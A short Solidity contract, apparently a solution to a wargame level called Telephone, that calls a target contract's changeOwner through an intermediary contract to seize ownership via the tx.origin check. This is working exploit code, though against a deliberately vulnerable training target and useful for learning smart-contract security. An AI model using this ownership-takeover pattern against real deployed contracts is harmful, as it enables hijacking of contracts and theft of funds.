// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "./telephone.sol";

contract Hacktelephone{
    Telephone public telephone;
    
    constructor(address _address) public {
        telephone = Telephone(_address);
    }
      function changeOwner(address _address) public {
        telephone.changeOwner(_address);


    }
}